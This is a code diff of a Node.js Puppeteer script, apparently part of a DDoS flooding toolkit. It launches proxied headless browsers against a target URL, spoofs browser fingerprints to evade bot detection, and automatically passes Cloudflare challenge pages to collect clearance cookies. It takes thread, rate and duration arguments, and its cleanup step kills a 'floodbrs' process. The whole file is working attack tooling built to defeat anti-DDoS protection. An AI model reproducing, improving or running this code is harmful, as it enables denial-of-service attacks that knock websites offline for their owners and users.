@@ -16,17 +16,71 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// ========== ENHANCED FIREWALL BYPASS TECHNIQUES ==========
+// ========== COMMAND LINE ARGUMENTS VALIDATION ==========
+if (process.argv.length < 6) {
+    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
+    process.exit(1);
+}
+
+const targetURL = process.argv[2];
+const threads = parseInt(process.argv[3]);
+const proxyFile = process.argv[4];
+const rate = process.argv[5];
+const duration = parseInt(process.argv[6]);
+
+let totalSolves = 0;
+
+// ========== UTILITY FUNCTIONS ==========
+const generateRandomString = (minLength, maxLength) => {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
+};
+
+const validKey = generateRandomString(5, 10);
+
+const readProxies = (filePath) => {
+    try {
+        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
+    } catch (error) {
+        console.error('Error reading proxies file:', error.message);
+        return [];
+    }
+};
+
+const maskProxy = (proxy) => {
+    const parts = proxy.split(':');
+    if (parts.length >= 2 && parts[0].split('.').length === 4) {
+        const ipParts = parts[0].split('.');
+        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
+    }
+    return proxy;
+};
+
+const coloredLog = (color, text) => {
+    console.log(`${color}${text}${COLORS.RESET}`);
+};
+
+const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));
+
+const randomElement = (array) => array[Math.floor(Math.random() * array.length)];
+
+// ========== USER AGENTS ==========
+const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+];
+
+// ========== ENHANCED FIREWALL BYPASS ==========
 const bypassFirewall = async (page) => {
     await page.evaluateOnNewDocument(() => {
-        // Enhanced automation detection removal
         Object.defineProperty(navigator, 'webdriver', { get: () => false });
         Object.defineProperty(navigator, 'plugins', { 
-            get: () => [1, 2, 3, 4, 5],
-            configurable: true
+            get: () => [1, 2, 3, 4, 5]
         });
         
-        // Override the permissions API
         const originalQuery = window.navigator.permissions.query;
         window.navigator.permissions.query = (parameters) => (
             parameters.name === 'notifications' ? 
@@ -34,7 +88,6 @@ const bypassFirewall = async (page) => {
                 originalQuery(parameters)
         );
 
-        // Mock Chrome runtime completely
         window.chrome = {
             runtime: {
                 connect: () => ({ onDisconnect: { addListener: () => {} } }),
@@ -47,48 +100,28 @@ const bypassFirewall = async (page) => {
             webstore: { onInstallStageChanged: {}, onDownloadProgress: {} }
         };
 
-        // Spoof WebGL
         const getParameter = WebGLRenderingContext.prototype.getParameter;
         WebGLRenderingContext.prototype.getParameter = function(parameter) {
             if (parameter === 37445) return 'Intel Inc.';
             if (parameter === 37446) return 'Intel Iris OpenGL Engine';
-            if (parameter === 34076) return 'WebKit WebGL';
-            if (parameter === 34077) return 'WebKit WebGL';
             return getParameter.apply(this, arguments);
         };
 
-        // Spoof audio context fingerprint
-        const originalGetChannelData = AudioBuffer.prototype.getChannelData;
-        AudioBuffer.prototype.getChannelData = function() {
-            const result = originalGetChannelData.apply(this, arguments);
-            const len = result.length;
-            for (let i = 0; i < len; i += 100) {
-                result[i] += (Math.random() * 0.0001) - 0.00005;
-            }
-            return result;
-        };
-
-        // Bypass headless detection
         Object.defineProperty(navigator, 'languages', {
-            get: () => ['en-US', 'en'],
-            configurable: true
+            get: () => ['en-US', 'en']
         });
 
         Object.defineProperty(navigator, 'hardwareConcurrency', {
-            value: 8,
-            configurable: true
+            value: 8
         });
 
         Object.defineProperty(navigator, 'deviceMemory', {
-            value: 8,
-            configurable: true
+            value: 8
         });
 
-        // Remove headless Chrome indicators
         delete navigator.__proto__.webdriver;
     });
 
-    // Additional stealth measures
     await page.setUserAgent(randomElement(userAgents));
     await page.setViewport({
         width: 1920 + Math.floor(Math.random() * 100),
@@ -99,7 +132,6 @@ const bypassFirewall = async (page) => {
         isMobile: false
     });
 
-    // Block unnecessary resources
     await page.setRequestInterception(true);
     page.on('request', (req) => {
         const resourceType = req.resourceType();
@@ -148,16 +180,13 @@ const getFirewallBypassArgs = () => [
     '--disable-dev-shm-usage',
     '--disable-accelerated-2d-canvas',
     '--disable-gpu',
-    `--user-agent=${randomElement(userAgents)}`,
     '--remote-debugging-port=0'
 ];
 
-// Enhanced challenge detection and solving
+// ========== CHALLENGE SOLVING ==========
 const solveAdvancedChallenge = async (page, browserProxy) => {
     try {
         console.log(`[DEBUG] Solving challenge for proxy: ${maskProxy(browserProxy)}`);
-        
-        // Wait longer for challenge to load
         await page.waitForTimeout(5000 + Math.random() * 3000);
 
         const url = page.url();
@@ -167,7 +196,6 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
         console.log(`[DEBUG] Current URL: ${url}`);
         console.log(`[DEBUG] Page title: ${title}`);
 
-        // Enhanced challenge detection
         const isChallenge = title.includes('Just a moment') || 
                            title.includes('Checking your browser') ||
                            title.includes('Attention Required') ||
@@ -183,7 +211,7 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
 
         console.log(`[DEBUG] Challenge detected, attempting to solve...`);
 
-        // Strategy 1: Wait for auto-redirect (most common)
+        // Strategy 1: Wait for auto-redirect
         try {
             await page.waitForNavigation({ 
                 waitUntil: 'networkidle2', 
@@ -195,17 +223,14 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
             console.log(`[DEBUG] Auto-redirect failed: ${e.message}`);
         }
 
-        // Strategy 2: Look for challenge iframe
+        // Strategy 2: Challenge iframe
         const challengeFrame = await page.$('iframe[src*="challenges"], iframe[src*="captcha"]');
         if (challengeFrame) {
             console.log(`[DEBUG] Found challenge iframe`);
             try {
                 const frame = await challengeFrame.contentFrame();
                 if (frame) {
-                    // Wait for challenge to load in iframe
                     await frame.waitForTimeout(3000);
-                    
-                    // Try to find and click submit button
                     const submitButton = await frame.$(
                         'input[type="submit"], button[type="submit"], .btn, #challenge-submit, [class*="submit"], [class*="button"]'
                     );
@@ -234,11 +259,11 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
             return true;
         }
 
-        // Strategy 4: Advanced human simulation
+        // Strategy 4: Human simulation
         console.log(`[DEBUG] Attempting human simulation`);
         await simulateAdvancedHumanBehavior(page);
         
-        // Strategy 5: Try form submission
+        // Strategy 5: Form submission
         const forms = await page.$$('form');
         for (const form of forms) {
             try {
@@ -249,9 +274,8 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
             } catch (e) {}
         }
 
-        // Final wait and check
+        // Final check
         await page.waitForTimeout(10000);
-        
         const newUrl = page.url();
         if (!newUrl.includes('challenges.cloudflare.com')) {
             console.log(`[DEBUG] Challenge appears to be solved`);
@@ -269,7 +293,6 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
 
 const simulateAdvancedHumanBehavior = async (page) => {
     try {
-        // Random mouse movements
         const viewport = page.viewport();
         const moves = 5 + Math.floor(Math.random() * 8);
         
@@ -282,7 +305,6 @@ const simulateAdvancedHumanBehavior = async (page) => {
             await page.waitForTimeout(100 + Math.random() * 300);
         }
 
-        // Random scrolling
         const scrollAmount = Math.random() * 1000;
         await page.evaluate((amount) => {
             window.scrollBy(0, amount);
@@ -290,7 +312,6 @@ const simulateAdvancedHumanBehavior = async (page) => {
 
         await page.waitForTimeout(1000 + Math.random() * 2000);
 
-        // More random movements
         await page.mouse.move(
             Math.random() * viewport.width,
             Math.random() * viewport.height,
@@ -302,22 +323,20 @@ const simulateAdvancedHumanBehavior = async (page) => {
     }
 };
 
-// Enhanced proxy handling with authentication
+// ========== PROXY HANDLING ==========
 const setupProxy = (browserProxy) => {
     if (!browserProxy) return null;
     
     const proxyParts = browserProxy.split(':');
     if (proxyParts.length === 2) {
-        // IP:PORT format
         return `--proxy-server=http://${browserProxy}`;
     } else if (proxyParts.length === 4) {
-        // IP:PORT:USERNAME:PASSWORD format
         return `--proxy-server=http://${proxyParts[0]}:${proxyParts[1]}`;
     }
     return null;
 };
 
-// Enhanced browser launch with proxy authentication
+// ========== BROWSER LAUNCH ==========
 const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
     const userAgent = randomElement(userAgents);
     let browser = null;
@@ -353,13 +372,10 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
         browser = await puppeteer.launch(launchOptions);
         const [page] = await browser.pages();
 
-        // Set user agent before navigation
         await page.setUserAgent(userAgent);
-
-        // Apply enhanced bypass techniques
         await bypassFirewall(page);
 
-        // Handle proxy authentication if needed
+        // Handle proxy authentication
         const proxyParts = browserProxy.split(':');
         if (proxyParts.length === 4) {
             await page.authenticate({
@@ -368,23 +384,19 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
             });
         }
 
-        // Set longer timeouts
         page.setDefaultNavigationTimeout(60000);
         page.setDefaultTimeout(30000);
 
-        // Navigate to target
         await page.goto(targetURL, {
             waitUntil: 'networkidle2',
             timeout: 60000
         });
 
-        // Solve challenges
         const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
         if (!challengeSolved) {
             throw new Error('Challenge solving failed');
         }
 
-        // Verify we have access to the target page
         const finalUrl = page.url();
         if (finalUrl.includes('challenges.cloudflare.com') || 
             finalUrl.includes('captcha') ||
@@ -392,7 +404,6 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
             throw new Error('Still on challenge page after solving attempt');
         }
 
-        // Get cookies
         const cookies = await page.cookies();
         if (!cookies || cookies.length === 0) {
             throw new Error('No cookies obtained');
@@ -421,7 +432,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
         }
 
         if (attempt < maxRetries) {
-            const delay = Math.pow(2, attempt) * 1000; // Exponential backoff
+            const delay = Math.pow(2, attempt) * 1000;
             await sleep(delay / 1000);
             return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
         }
@@ -430,7 +441,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     }
 };
 
-// Enhanced thread management
+// ========== THREAD MANAGEMENT ==========
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
         coloredLog(COLORS.RED, `[FAILED] Max retries reached for proxy: ${maskProxy(browserProxy)}`);
@@ -448,12 +459,11 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
                 return;
             }
 
-            // Log success
             const cookieInfo = {
                 Page: response.title,
                 Proxy: maskProxy(browserProxy),
                 'User-agent': response.userAgent,
-                cookie: response.cookies.substring(0, 50) + '...' // Truncate for display
+                cookie: response.cookies.substring(0, 50) + '...'
             };
             
             coloredLog(COLORS.GREEN, `[SUCCESS] Obtained cookies: ${JSON.stringify(cookieInfo, null, 2)}`);
@@ -494,47 +504,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
     }
 };
 
-// Rest of your existing utility functions remain the same...
-const generateRandomString = (minLength, maxLength) => {
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
-};
-
-const validKey = generateRandomString(5, 10);
-
-const readProxies = (filePath) => {
-    try {
-        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
-    } catch (error) {
-        console.error('Error reading proxies file:', error.message);
-        return [];
-    }
-};
-
-const maskProxy = (proxy) => {
-    const parts = proxy.split(':');
-    if (parts.length >= 2 && parts[0].split('.').length === 4) {
-        const ipParts = parts[0].split('.');
-        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
-    }
-    return proxy;
-};
-
-const coloredLog = (color, text) => {
-    console.log(`${color}${text}${COLORS.RESET}`);
-};
-
-const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));
-
-const randomElement = (array) => array[Math.floor(Math.random() * array.length)];
-
-// Enhanced user agents
-const userAgents = [
-    // Add your user agents here...
-];
-
-// Initialize queue
+// ========== QUEUE SETUP ==========
 const queue = async.queue((task, done) => {
     startThread(targetURL, task.browserProxy, task, done);
 }, threads);
@@ -543,7 +513,7 @@ queue.drain(() => {
     coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
 });
 
-// Main execution
+// ========== MAIN EXECUTION ==========
 const main = async () => {
     const proxies = readProxies(proxyFile);
     if (proxies.length === 0) {
@@ -553,17 +523,14 @@ const main = async () => {
 
     coloredLog(COLORS.GREEN, `[START] Launching with ${proxies.length} proxies, ${threads} threads, ${duration}s duration`);
     
-    // Add all proxies to queue
     proxies.forEach(proxy => {
         queue.push({ browserProxy: proxy });
     });
 
-    // Set timeout for automatic shutdown
     setTimeout(() => {
         coloredLog(COLORS.YELLOW, '[INFO] Time limit reached, shutting down...');
         queue.kill();
         
-        // Cleanup processes
         exec('pkill -f "node.*floodbrs"', () => {
             coloredLog(COLORS.GREEN, '[INFO] Cleanup completed');
             process.exit(0);
@@ -571,7 +538,7 @@ const main = async () => {
     }, duration * 1000);
 };
 
-// Error handling
+// ========== ERROR HANDLING ==========
 process.on('uncaughtException', (error) => {
     coloredLog(COLORS.RED, `[FATAL] Uncaught Exception: ${error.message}`);
 });
@@ -580,7 +547,7 @@ process.on('unhandledRejection', (error) => {
     coloredLog(COLORS.RED, `[FATAL] Unhandled Rejection: ${error.message}`);
 });
 
-// Start the application
+// ========== START APPLICATION ==========
 coloredLog(COLORS.GREEN, '[INFO] Starting browser automation...');
 main().catch(err => {
     coloredLog(COLORS.RED, `[FATAL] Main execution failed: ${err.message}`);
